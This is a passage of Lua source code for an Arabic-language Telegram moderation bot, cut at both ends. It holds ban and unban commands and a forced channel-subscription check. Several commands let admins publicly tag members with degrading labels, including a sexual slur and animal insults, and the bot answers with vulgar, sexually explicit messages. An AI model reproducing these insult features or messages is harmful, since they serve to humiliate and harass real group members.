if #list == 0 then
t = " ⋄لا يوجد كساس غيرك"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع كس") and tonumber(msg.reply_to_message_id_) ~= 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'kss:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
local  statuss  = '\n⋄تم رفع العضو كس في الجروب\n⋄تفضل ابدا نيك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل كس")) and msg.reply_to_message_id_ then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'kss:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيل العضو كس من الجروب\n⋄وقف نيك مؤقتا'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'تنزيل البقرات' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
database:del(bot_id..'Bakra:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⋄تم تنزيل جميع البقرات بالجروب')
end
if text == ("تاك للبقرات") then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'Bakra:User'..msg.chat_id_)
t = "\n⋄قائمة البقرات الجروب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."»> البقره [@"..username.."]\n"
else
t = t..""..k.."»> البقره "..v.."\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد البقره"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع بقره") and tonumber(msg.reply_to_message_id_) ~= 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Bakra:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
local  statuss  = '\n⋄تم رفع بقره في الجروب\n⋄ها يالهايشه تع احلبك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل بقره")) and msg.reply_to_message_id_ then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Bakra:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيل بقره من الجروب\n⋄تعال هاك حليب مالتك'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'تنزيل الطليان' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
database:del(bot_id..'Tele:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⋄تم تنزيل جميع طليان بالجروب')
end
if text == ("تاك للطليان") then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'Tele:User'..msg.chat_id_)
t = "\n⋄قائمة الطليان الجروب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."»> الطلي[@"..username.."]\n"
else
t = t..""..k.."»> الطلي "..v.."\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد طلي"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع طلي") and tonumber(msg.reply_to_message_id_) ~= 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Tele:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
local  statuss  = '\n⋄تم رفع الطلي في الجروب\n⋄طلع برا ابو البعرور الوصخ'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل طلي")) and msg.reply_to_message_id_ then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Tele:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيل الطلي من الجروب\n⋄هاك اخذ بعرور'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح الحكاكين' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⋄تم مسح كل الحكاكين')
end
if text == ("تاك للحكاكين") then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n⋄قائمة حكاكين الجروب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."»> الحكاك [@"..username.."]\n"
else
t = t..""..k.."»> الحكاك `"..v.."`\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد حكاك"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع حكاك") and tonumber(msg.reply_to_message_id_) ~= 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
local  statuss  = '\n⋄تم رفع حكاك في الجروب\n⋄احمرت ولا لسا'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل حكاك")) and msg.reply_to_message_id_ then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيل حكاك من الجروب\n⋄لا يسطت هيفضل حكاك رسمي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'تنزيل خنزيره' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
database:del(bot_id..'Jred:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⋄تم تنزيل جميع جريزي')
end
if text == ("تاك للخنازير") then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'Jred:User'..msg.chat_id_)
t = "\n⋄قائمة خنازير الجروب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."»> الخنزير [@"..username.."]\n"
else
t = t..""..k.."»> الخنزير "..v.."\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد خنازير"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع خنزير") and tonumber(msg.reply_to_message_id_) ~= 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Jred:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
local  statuss  = '\n⋄تم رفع خنزير في الجروب\n⋄يديني امشي اطلع برا يمعفن'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل خنزير")) and msg.reply_to_message_id_ then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Jred:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تنزيل خنزير من الجروب\n⋄هيفصل خنزير برده 😏'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
--------------------------------------------
--[[
if text == "مسح المطرودين" then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
local num = 0 
for k,y in pairs(result.members_) do 
num = num + 1  
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = y.user_id_, status_ = { ID = "ChatMemberStatusLeft"}, }, dl_cb, nil)  
end  
send(msg.chat_id_, msg.id_,"⋄تم مسح المطرودين ") 
end    
tdcli_function({ID="GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersKicked"},offset_ = 0,limit_ = 1000}, delbans, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_})    
end
]]--
if text == 'مسح المحظورين' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
database:del(bot_id..'Ban:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n⋄تم مسح المحظورين')
end
if text == ("المحظورين") then
local list = database:smembers(bot_id..'Ban:User'..msg.chat_id_)
t = "\n⋄قائمة محظورين الجروب \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد محظورين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("حظر") and msg.reply_to_message_id_ ~= 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الحظر') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع حظر البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⋄عذرا لا تستطيع حظر ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' ⋄ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ⋄البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'Ban:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم حظره'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
chat_kick(result.chat_id_, result.sender_user_id_)
end,nil)   
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if text and text:match("^حظر @(.*)$") and Mod(msg) then
local username = text:match("^حظر @(.*)$")
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الحظر') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⋄عذرا لا تستطيع حظر ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data)       
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' ⋄ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ⋄البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'Ban:User'..msg.chat_id_, result.id_)
usertext = '\n⋄المستخدم »> ['..result.title_..'](t.me/'..(username or 'GLOBLA')..')'
status  = '\n⋄تم حظره'
texts = usertext..status
chat_kick(msg.chat_id_, result.id_)
send(msg.chat_id_, msg.id_, texts)
end,nil)   
end
else
send(msg.chat_id_, msg.id_, ' ⋄لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^حظر (%d+)$") and Mod(msg) then
local userid = text:match("^حظر (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ⋄تم تعطيل الحظر') 
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع حظر البوت")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⋄عذرا لا تستطيع حظر ( '..Rutba(userid,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' ⋄ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ⋄البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'Ban:User'..msg.chat_id_, userid)
chat_kick(msg.chat_id_, userid)  
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم حظره'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم حظره'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end,nil)   
end
return false
end
if text == ("الغاء حظر") and msg.reply_to_message_id_ then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, ' ⋄انا لست محظورآ \n') 
return false 
end
database:srem(bot_id..'Ban:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم الغاء حظره'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
 
if text and text:match("^الغاء حظر @(.*)$") and Mod(msg) then
local username = text:match("^الغاء حظر @(.*)$") 
